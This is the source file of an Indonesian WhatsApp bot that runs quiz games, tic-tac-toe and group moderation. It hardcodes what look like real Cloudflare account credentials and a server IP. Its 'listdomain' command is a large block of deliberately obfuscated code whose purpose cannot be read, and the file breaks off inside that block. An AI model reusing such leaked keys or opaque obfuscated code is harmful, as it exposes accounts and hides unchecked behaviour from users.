/**
   * Create By Dika Ardnt.
   * Contact Me on wa.me/6288292024190
   * Follow https://github.com/DikaArdnt
*/

require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

module.exports = hisoka = async (hisoka, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await hisoka.decodeJid(hisoka.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
	    const isMedia = /image|video|sticker|audio/.test(mime)
	
        // Group
        const groupMetadata = m.isGroup ? await hisoka.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	
	const AhmadBot = {
    ahmadhost: {
        nama: 'BOGORHOSTLIVE',
        cloudflare: {
            listdomain: { '1': '.newtahun2022.com'},
            zona: { '1': 'c8754c9ff1f1d42f6baf237e70925069'},
            tersedia: ['1'],
            data: {
                email: 'fadliarkal@gmail.com',
                apikey: '373b46bc7107e71c3560cb75b254be8cae4a7',
            }
        },
        ip: '20.24.65.20',
        grup: ['120363039030876340@g.us']
    },
    contoh: {
        nama: 'cuma contoh',
        cloudflare: {
            listdomain: { '1': '.ahmad.systems', '2': '.xnxx.com', '3': '.ph.com'},
            zona: { '1': 'isi zoneid', '2': 'isi zoneid', '3': 'isi zoneid'},
            tersedia: ['1'],
            data: {
                email: 'email cloudflare',
                apikey: 'apikey global',
            }
        },
        ip: 'ip server',
        grup: ['grup id','grup id']
    },

//Batas
}


const HBK97DG53 = {
    ahmadhost: [
    	AhmadBot.ahmadhost.grup[0],
    ],
    contoh: [
    	AhmadBot.contoh.grup[0],
    ],

//Batas
}
function BH8kj86V(id) {
    if (HBK97DG53.ahmadhost.includes(id)) return AhmadBot.ahmadhost
    if (HBK97DG53.contoh.includes(id)) return AhmadBot.contoh
    return false

//Batas
}
const BJ87V32K = [
    AhmadBot.ahmadhost.grup[0],
    AhmadBot.contoh.grup[0],

//Batas
]

	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	    
        // Public & Self
        if (!hisoka.public) {
            if (!m.key.fromMe) return
        }

        // Push Message To Console && Auto Read
        if (m.message) {
            hisoka.sendReadReceipt(m.chat, m.sender, [m.key.id])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
	
	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await hisoka.setStatus(`${'NelzBotz'} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await hisoka.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        hisoka.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: hisoka.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, hisoka.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        hisoka.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            hisoka.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'TEBAK LAGU' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, 'NelzBotz', m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'TEBAK GAMBAR' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, 'NelzBotz', m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'TEBAK KATA' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, 'NelzBotz', m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'TEBAK LONTONG' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, 'NelzBotz', m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'TEBAK KALIMAT' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, 'NelzBotz', m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'TEBAK LIRIK' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, 'NelzBotz', m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'TEBAK TEBAKAN' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, 'NelzBotz', m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await hisoka.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await hisoka.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    hisoka.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    hisoka.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) hisoka.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) hisoka.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    hisoka.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) hisoka.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    hisoka.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
	    
        switch(command) {
          case 'addpackage':
if (args.length < 1) return reply(`masukan usernamenya`)
var user = args.join(" ")
var data = {
	pkgwhm: "pkgwhm",
	usergz: `${user}`
}
var a = await axios.request("https://tools.dzhosting.my.id/curlserver.php", {
	method: "POST",
	data: new URLSearchParams(Object.entries(data)),
	headers: {
		"user-agent": "Mozilla/5.0 (Linux; Android 11; V2038) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36",
		"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
		"accept": "*/*"
	}
})

reply(a.data)
break
            case 'listdomain':
                (function(_0x1efe1d,_0x5bab8d){function _0x4a6d00(_0x4111c9,_0x3a6963,_0x16c077,_0xba5fcc,_0x4f9bbf){return _0x1084(_0x16c077-0x3ae,_0x4111c9);}function _0x440a10(_0x3af093,_0x1c128c,_0x2034fd,_0x33884f,_0x48f9ee){return _0x1084(_0x2034fd- -0x228,_0x1c128c);}function _0x5bd5d7(_0x560948,_0x7a8252,_0x430625,_0x3c6fba,_0x19d2db){return _0x1084(_0x7a8252- -0x11d,_0x19d2db);}function _0x59ce02(_0x36ad5c,_0x6dba90,_0x19e81d,_0x29d015,_0x1d10ca){return _0x1084(_0x29d015- -0x1ac,_0x36ad5c);}const _0x33a7c2=_0x1efe1d();function _0x4caca7(_0x71a198,_0x3b999c,_0x7e7175,_0x5c61b9,_0x58e440){return _0x1084(_0x7e7175- -0x51,_0x71a198);}while(!![]){try{const _0x183eb2=-parseInt(_0x5bd5d7(-0xb5,-0x6f,0x8c,0x3a,'dv[8'))/(-0x1230+-0xd*-0x288+-0x1*0xeb7)+parseInt(_0x5bd5d7(0x142,0x56,0x52,0x31,'72&5'))/(0x1152+0x2*0xd7b+-0x2c46)*(-parseInt(_0x5bd5d7(0xe5,0x1a6,0xad,0xe7,'zE7F'))/(-0x2*0x662+-0x1dab+-0x2a72*-0x1))+parseInt(_0x440a10(0x12c,'Ox@U',0x38,-0x45,0x46))/(0x14d4+-0x1*0xb61+0x325*-0x3)+-parseInt(_0x5bd5d7(-0x1c,-0x6a,0xd,0x1b,'72&5'))/(0x1f2+0x4b6*0x1+-0x6a3)+parseInt(_0x59ce02('L*Rn',0x57,0x16,0x78,-0x4f))/(-0xe0*-0x3+0x7ed*-0x3+0x152d)+parseInt(_0x5bd5d7(-0xf2,0x16,0xf3,0xca,'@BI#'))/(-0x1*-0x79d+0x137*-0x5+-0x3*0x81)*(-parseInt(_0x59ce02('h(fb',0x179,-0x45,0xcd,-0x3))/(0x8de+-0xee+-0x1fa*0x4))+parseInt(_0x4a6d00('ZuUF',0x59f,0x62c,0x6a8,0x5aa))/(0x15*0xfe+0x1dd1+-0x2aa*0x13)*(parseInt(_0x59ce02('lD7C',-0x162,0x6f,-0x5c,0x60))/(-0x44f*-0x5+-0x556+-0x102b));if(_0x183eb2===_0x5bab8d)break;else _0x33a7c2['push'](_0x33a7c2['shift']());}catch(_0x5edccd){_0x33a7c2['push'](_0x33a7c2['shift']());}}}(_0x24f0,0x62ea6+-0x5dc5*-0x29+-0xd795b));const _0x13412d=(function(){const _0x367c9b={'GJWyo':_0xada6e2(0x1d8,0x231,'lD7C',0x287,0x17e)+_0xada6e2(0x1c2,0x203,'R(LG',0x1eb,0x1ef)+_0xada6e2(-0x20,0x10f,'5DAM',0xa0,0xd5)+')','LikAS':_0xada6e2(0x25b,0x21b,'oyGJ',0x2e7,0x1c9)+_0xada6e2(0x216,0xb9,'zE7F',0x1c3,0x15a)+_0x2dc2ba(0x195,0x2b9,0x1f4,0x2ad,'R(LG')+_0x2dc2ba(0x1fe,0xfe,0x1a4,0x1ab,'dVI7')+_0x520e27(-0x27,-0x73,-0xe,0x63,'7qZp')+_0x520e27(-0x9,-0x88,-0x95,0x29,'L*Rn')+_0x2dc2ba(0x1dc,0xb6,0xc7,0xd2,'l09A'),'LWNwf':function(_0x1310d6,_0x2dad61){return _0x1310d6(_0x2dad61);},'kJwSu':_0x2dc2ba(0x1e7,0x174,0xd8,0x16,'xIhp'),'AWhfS':function(_0x47ee65,_0xe683dc){return _0x47ee65+_0xe683dc;},'WjSXT':_0x44c254('l09A',0x2c5,0x3e1,0x3b3,0x3b8),'gXaat':function(_0x357e16,_0x5f2e7e){return _0x357e16+_0x5f2e7e;},'bUvna':_0x2dc2ba(0x1e4,0x1e8,0x21a,0x163,'[emO'),'lqdxT':function(_0x4e4e4a){return _0x4e4e4a();},'gfxwL':function(_0x329618,_0xfe3c71){return _0x329618!==_0xfe3c71;},'qvZhQ':_0x44c254('^os0',0x1e3,0x1e7,0xe0,0x1e5),'DaqTd':_0x520e27(0x90,-0x68,0xa5,0x93,'ZuUF'),'udYvE':function(_0x218a72,_0x37f748){return _0x218a72===_0x37f748;},'IelgB':_0x44c254('u!a)',0x209,0x203,0x3e9,0x2eb),'ZNciB':_0x3f6476(0x2fb,0x32a,0x26d,'wk[X',0x26d),'GDaot':_0x44c254('7y8A',0x2f5,0x2ce,0x35d,0x3a2)};function _0x44c254(_0x2b9af9,_0x4fee43,_0x445958,_0x2216c8,_0x4601f0){return _0x1084(_0x4601f0-0x133,_0x2b9af9);}let _0x4ba804=!![];function _0x520e27(_0x383ad7,_0x34cb9b,_0x255a18,_0x3460b2,_0x2827c8){return _0x1084(_0x383ad7- -0x11f,_0x2827c8);}function _0xada6e2(_0x2894ef,_0x4d7302,_0x440dee,_0x238f22,_0x189da3){return _0x1084(_0x189da3- -0x6b,_0x440dee);}function _0x3f6476(_0x455efa,_0x374b9e,_0x4bb8bd,_0x3f7252,_0x2ee4f7){return _0x1084(_0x2ee4f7-0xe0,_0x3f7252);}function _0x2dc2ba(_0x3f04a6,_0x376f2a,_0xd51e1a,_0x424503,_0x1a5f33){return _0x1084(_0xd51e1a- -0x10,_0x1a5f33);}return function(_0x568f68,_0x2c2b12){function _0x4195e0(_0x238389,_0x40bce2,_0x446563,_0x266e2c,_0x5625b6){return _0x3f6476(_0x238389-0x175,_0x40bce2-0x11a,_0x446563-0x1d5,_0x266e2c,_0x238389-0x55);}const _0xe7972a={'LFypk':_0x367c9b[_0x46e5fa(0x53,0x71,'u!a)',0xda,0x73)],'Wiwuo':_0x367c9b[_0xd8421d(0x1a2,0x2ae,0x243,'EMxX',0x30c)],'wfLSa':function(_0x3b1c4a,_0x470da7){function _0x1ed99f(_0x5ad308,_0x38f8df,_0x2c52fd,_0xe869d7,_0x15bd54){return _0xd8421d(_0x5ad308-0x21,_0xe869d7-0xb5,_0x2c52fd-0xb4,_0x15bd54,_0x15bd54-0x1a1);}return _0x367c9b[_0x1ed99f(0x3ac,0x4b4,0x41e,0x411,'wpda')](_0x3b1c4a,_0x470da7);},'NjLdr':_0x367c9b[_0x46e5fa(0x3f,0x12c,'h(fb',0x1c2,0x229)],'bRkvG':function(_0x6eafcc,_0x344c0a){function _0x2b8ee7(_0x300f9c,_0x51eace,_0x4d23d9,_0x5d55e4,_0x542923){return _0x46e5fa(_0x300f9c-0x65,_0x542923-0x13a,_0x4d23d9,_0x5d55e4-0x1c5,_0x542923-0x14c);}return _0x367c9b[_0x2b8ee7(0x2b9,0x2d5,'@BI#',0x2c3,0x1ef)](_0x6eafcc,_0x344c0a);},'cEzOI':_0x367c9b[_0xd8421d(0x2ed,0x34d,0x308,'rKm]',0x442)],'hKFMp':function(_0x3de04b,_0x20286d){function _0x40b91a(_0x3407ec,_0x1ce4af,_0x122d23,_0x4c0bd8,_0x5c3db7){return _0x35b44f(_0x122d23,_0x1ce4af-0x83,_0x122d23-0xbe,_0x5c3db7-0x344,_0x5c3db7-0x8f);}return _0x367c9b[_0x40b91a(0x508,0x5ba,'7y8A',0x58e,0x4d3)](_0x3de04b,_0x20286d);},'ajdLw':_0x367c9b[_0x306679(-0x3a,-0xdb,-0x130,-0xc1,'V*E8')],'YYrpL':function(_0x2a3d19){function _0x590bff(_0x3e7e54,_0x2de4f3,_0x2722f3,_0x43901f,_0x241a5a){return _0x4195e0(_0x2722f3- -0x6c,_0x2de4f3-0x10f,_0x2722f3-0x1b9,_0x241a5a,_0x241a5a-0x9);}return _0x367c9b[_0x590bff(0x1af,0x1cb,0x19c,0x2a5,'k4!p')](_0x2a3d19);},'nWeHT':function(_0x11e75a,_0x11401c){function _0xbbe9ba(_0x582b84,_0xe620e6,_0x758a58,_0x5aea8d,_0x666028){return _0x35b44f(_0x666028,_0xe620e6-0x20,_0x758a58-0x183,_0x758a58- 